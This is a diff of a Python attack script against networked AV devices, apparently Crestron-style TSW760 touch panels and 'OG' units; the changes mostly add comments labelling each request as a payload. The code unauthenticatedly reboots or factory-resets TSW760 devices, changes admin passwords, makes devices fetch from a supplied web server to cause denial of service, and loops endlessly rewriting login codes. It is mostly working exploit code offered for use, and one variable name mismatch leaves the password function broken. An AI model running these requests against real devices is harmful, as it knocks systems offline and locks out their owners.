@@ -119,14 +119,19 @@ def og_Login(host,username,password):
 #This code will change its method based on the version 
 def reboot(host,model,username,password):
 	if model == 'TSW760':
+		#Payload
 		Data = {"Device": {"DeviceOperations": {"Reboot": "true"}}}
+		#Send Requeste
 		reboot = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
 	elif model == 'OG':
 		cookie = og_Login(host,username,password)
+		#Target URL
 		url = "https://"+ host + "/cgi-bin/return.cgi"
+		#Payload
 		data = {
 			"command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
 		}
+		#Send Request
 		reboot = requests.post(url=url,data=data, verify=False)
 
 		print("Reboot Incoming")
@@ -136,18 +141,22 @@ def reboot(host,model,username,password):
 #Please note that this can knock the device off the network and will require manual reconfiguration to fix.
 def restore(host,model):
 	if model == 'TSW760':
+		#Payload
 		Data = {"Device": {"DeviceOperations": {"Restore": "true"}}}
+		#Send Request
 		restore = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
 	else:
 		pass
 #This code will  change the password of a projector.
 def change_pass(host, username, password, newpass):
 	cookie = og_Login(host,username,password)
-	#Change Pass
+	#Target URL
 	url = "https://"+ host + "/cgi-bin/return.cgi"
+	#Payload
 	data = {
 		"command" : "<Send><seid>" + cookie + "</seid><name>LONG_ADMIN_PWD</name><value>" + newPass + "</value></Send>"
 	}
+	#Send Request
 	changePass = requests.post(url=url,data=data, verify=False)
 	print("Password Change Request Sent")
 
@@ -156,12 +165,14 @@ def change_pass(host, username, password, newpass):
 #If this was looped with all devices it could potentially take a device offline
 def web_dos(host,username,password,webserver):
 	cookie = og_Login(host,username,password)
-
+	#Target URL
 	url = "https://"+ host + "/cgi-bin/return.cgi"
+	#Payload
 	data = {
 		"command" : "<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + webserver + "</address><logo>TheWeb.png</logo></upload></Send>"
 	}
-	remoteViewOn = requests.post(url=url,data=data, verify=False)
+	#Send Request
+	webdos = requests.post(url=url,data=data, verify=False)
 	print("Web Request Sent")
 
 #This code will begin cycling through various connect codes.
@@ -170,11 +181,15 @@ def code_cycle(host,username,password):
 	cookie = og_Login(host,username,password)
 	try:
 		while True:
+			#Generate Random Code
 			randomInt = random.randint(1,9999)
+			#Target URL
 			url = "https://"+ host + "/cgi-bin/return.cgi"
+			#Payload
 			data = {
 				'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
 			}
+			#Send Request
 			cycle = requests.post(url=url,data=data, verify=False)
 			print("Cycle")
 	except KeyboardInterrupt:
